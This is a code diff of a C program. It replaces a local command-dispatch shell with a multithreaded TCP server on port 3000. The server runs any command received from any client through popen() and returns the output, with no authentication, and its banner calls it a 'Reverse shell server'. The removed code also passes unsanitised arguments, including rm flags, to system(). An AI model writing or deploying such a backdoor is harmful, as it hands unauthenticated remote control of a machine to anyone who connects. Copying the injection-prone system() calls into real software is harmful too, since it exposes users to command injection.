@@ -2,274 +2,145 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
+#include <pthread.h>
 #include <errno.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
 
-#define MAX_INPUT 1024
+#define PORT 3000
+#define BUFFER_SIZE 1024
 
-// Function to print the current working directory
-void print_pwd()
+// Thread function to handle an individual client connection.
+// The server receives commands from the client, executes them locally,
+// and sends the output back to the client. The server supports "exit"
+// to close the client session.
+void *client_handler(void *arg)
 {
-    char cwd[1024];
-    if (getcwd(cwd, sizeof(cwd)) != NULL)
-    {
-        printf("Current Working Directory: %s\n", cwd);
-    }
-    else
-    {
-        perror("getcwd() error");
-    }
-}
+    int client_sock = *(int *)arg;
+    free(arg);
+    char command[BUFFER_SIZE];
+    char output[BUFFER_SIZE * 2]; // Buffer to store execution output
+    ssize_t num_read;
 
-// Function to echo text to the output
-void echo_text(const char *args)
-{
-    printf("%s\n", args);
-}
+    while (1)
+    {
+        memset(command, 0, sizeof(command));
+        // Receive command from the client
+        num_read = recv(client_sock, command, sizeof(command) - 1, 0);
+        if (num_read <= 0)
+        {
+            perror("recv failed or connection closed");
+            break;
+        }
+        command[num_read] = '\0';
 
-// Function to change directory
-void change_directory(const char *path)
-{
-    if (chdir(path) == 0)
-    {
-        print_pwd();
+        // If the command is "exit", break out of the loop
+        if (strncmp(command, "exit", 4) == 0)
+        {
+            break;
+        }
+
+        // Execute the command using popen() and capture the output
+        FILE *fp = popen(command, "r");
+        if (fp == NULL)
+        {
+            snprintf(output, sizeof(output), "Failed to execute command.\n");
+        }
+        else
+        {
+            memset(output, 0, sizeof(output));
+            size_t total = 0;
+            char temp[BUFFER_SIZE];
+            while (fgets(temp, sizeof(temp), fp) != NULL)
+            {
+                size_t len = strlen(temp);
+                if (total + len < sizeof(output))
+                {
+                    strcat(output, temp);
+                    total += len;
+                }
+                else
+                {
+                    break;
+                }
+            }
+            pclose(fp);
+        }
+
+        // Send the command output back to the client
+        if (send(client_sock, output, strlen(output), 0) < 0)
+        {
+            perror("send failed");
+            break;
+        }
     }
-    else
-    {
-        perror("cd error");
-    }
+
+    close(client_sock);
+    pthread_exit(NULL);
 }
 
 int main()
 {
-    char input[MAX_INPUT];
+    int server_sock, *client_sock_ptr;
+    struct sockaddr_in server_addr, client_addr;
+    socklen_t client_addr_len = sizeof(client_addr);
 
-    printf("Simple Command Server. Type 'exit' to quit.\n");
-    while (1)
+    // Create the socket
+    if ((server_sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
     {
-        printf("> ");
-        if (fgets(input, MAX_INPUT, stdin) == NULL)
-        {
-            break;
-        }
-        // Remove the newline character at the end
-        input[strcspn(input, "\n")] = '\0';
-
-        // Check for exit command
-        if (strcmp(input, "exit") == 0)
-        {
-            break;
-        }
-
-        // Split the input into command and arguments
-        char *cmd = strtok(input, " ");
-        char *args = strtok(NULL, "\n"); // The rest is considered as the argument
-
-        if (cmd == NULL)
-        {
-            continue;
-        }
-
-        // The server supports alternate command names for similar functionality
-        if (strcmp(cmd, "pwd") == 0 || strcmp(cmd, "directory") == 0 ||
-            strcmp(cmd, "working") == 0 || strcmp(cmd, "current") == 0)
-        {
-            print_pwd();
-        }
-        else if (strcmp(cmd, "echo") == 0)
-        {
-            if (args)
-            {
-                echo_text(args);
-            }
-            else
-            {
-                printf("\n");
-            }
-        }
-        else if (strcmp(cmd, "ls") == 0)
-        {
-            // If an argument is provided, assume it's a directory to list
-            char command[256];
-            if (args)
-            {
-                snprintf(command, sizeof(command), "ls %s", args);
-            }
-            else
-            {
-                snprintf(command, sizeof(command), "ls");
-            }
-            system(command);
-        }
-        else if (strcmp(cmd, "cd") == 0)
-        {
-            if (args)
-            {
-                change_directory(args);
-            }
-            else
-            {
-                printf("cd requires a directory argument.\n");
-            }
-        }
-        else if (strcmp(cmd, "cat") == 0)
-        {
-            if (args)
-            {
-                char command[256];
-                snprintf(command, sizeof(command), "cat %s", args);
-                system(command);
-            }
-            else
-            {
-                printf("cat requires a filename argument.\n");
-            }
-        }
-        else if (strcmp(cmd, "mv") == 0)
-        {
-            // Expected format: mv source target
-            char *src = strtok(args, " ");
-            char *dest = strtok(NULL, " ");
-            if (src && dest)
-            {
-                if (rename(src, dest) != 0)
-                {
-                    perror("mv error");
-                }
-            }
-            else
-            {
-                printf("Usage: mv <source> <destination>\n");
-            }
-        }
-        else if (strcmp(cmd, "cp") == 0)
-        {
-            // Here we rely on calling the underlying system command
-            if (args)
-            {
-                char command[256];
-                snprintf(command, sizeof(command), "cp %s", args);
-                system(command);
-            }
-            else
-            {
-                printf("cp requires source and destination arguments.\n");
-            }
-        }
-        else if (strcmp(cmd, "rm") == 0)
-        {
-            // Supports basic removal; note that dangerous flags like -rf are passed along as-is
-            if (args)
-            {
-                char command[256];
-                snprintf(command, sizeof(command), "rm %s", args);
-                system(command);
-            }
-            else
-            {
-                printf("rm requires arguments (e.g., -rf filename or directory).\n");
-            }
-        }
-        else if (strcmp(cmd, "mkdir") == 0)
-        {
-            if (args)
-            {
-                char command[256];
-                snprintf(command, sizeof(command), "mkdir %s", args);
-                system(command);
-            }
-            else
-            {
-                printf("mkdir requires a directory name.\n");
-            }
-        }
-        else if (strcmp(cmd, "locate") == 0)
-        {
-            if (args)
-            {
-                char command[256];
-                snprintf(command, sizeof(command), "locate %s", args);
-                system(command);
-            }
-            else
-            {
-                printf("locate requires a search term.\n");
-            }
-        }
-        else if (strcmp(cmd, "wheris") == 0)
-        {
-            if (args)
-            {
-                char command[256];
-                snprintf(command, sizeof(command), "whereis %s", args);
-                system(command);
-            }
-            else
-            {
-                printf("wheris requires a binary name.\n");
-            }
-        }
-        else if (strcmp(cmd, "find") == 0)
-        {
-            if (args)
-            {
-                char command[256];
-                snprintf(command, sizeof(command), "find %s", args);
-                system(command);
-            }
-            else
-            {
-                printf("find requires arguments.\n");
-            }
-        }
-        else if (strcmp(cmd, "grep") == 0)
-        {
-            if (args)
-            {
-                char command[256];
-                snprintf(command, sizeof(command), "grep %s", args);
-                system(command);
-            }
-            else
-            {
-                printf("grep requires a pattern and file arguments.\n");
-            }
-        }
-        else if (strcmp(cmd, "sed") == 0)
-        {
-            if (args)
-            {
-                char command[256];
-                snprintf(command, sizeof(command), "sed %s", args);
-                system(command);
-            }
-            else
-            {
-                printf("sed requires a command and file argument.\n");
-            }
-        }
-        else if (strcmp(cmd, "mkfs") == 0 || strcmp(cmd, "fdisk") == 0)
-        {
-            // Formatting and partitioning commands are typically not handled by such a server.
-            printf("The command '%s' is not supported by this server for safety reasons.\n", cmd);
-        }
-        else if (strcmp(cmd, "nano") == 0 || strcmp(cmd, "vi") == 0 || strcmp(cmd, "emacs") == 0)
-        {
-            if (args)
-            {
-                char command[256];
-                snprintf(command, sizeof(command), "%s %s", cmd, args);
-                system(command);
-            }
-            else
-            {
-                printf("Usage: %s <filename>\n", cmd);
-            }
-        }
-        else
-        {
-            printf("Unknown command: %s\n", cmd);
-        }
+        perror("socket creation failed");
+        exit(EXIT_FAILURE);
     }
 
+    // Prepare the sockaddr_in structure
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(PORT);
+    server_addr.sin_addr.s_addr = INADDR_ANY;
+    memset(&(server_addr.sin_zero), '\0', 8);
+
+    // Bind the socket to the port
+    if (bind(server_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
+    {
+        perror("bind failed");
+        close(server_sock);
+        exit(EXIT_FAILURE);
+    }
+
+    // Listen for incoming connections
+    if (listen(server_sock, 5) < 0)
+    {
+        perror("listen failed");
+        close(server_sock);
+        exit(EXIT_FAILURE);
+    }
+
+    printf("Reverse shell server listening on port %d...\n", PORT);
+
+    // Main loop: accept incoming connections and spawn a thread for each
+    while (1)
+    {
+        int *client_sock = malloc(sizeof(int));
+        if ((*client_sock = accept(server_sock, (struct sockaddr *)&client_addr, &client_addr_len)) < 0)
+        {
+            perror("accept failed");
+            free(client_sock);
+            continue;
+        }
+        printf("Connection accepted from %s:%d\n", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
+
+        pthread_t tid;
+        if (pthread_create(&tid, NULL, client_handler, client_sock) != 0)
+        {
+            perror("Failed to create thread");
+            close(*client_sock);
+            free(client_sock);
+            continue;
+        }
+        // Detach thread so that resources are freed automatically when thread exits
+        pthread_detach(tid);
+    }
+
+    close(server_sock);
     return 0;
 }
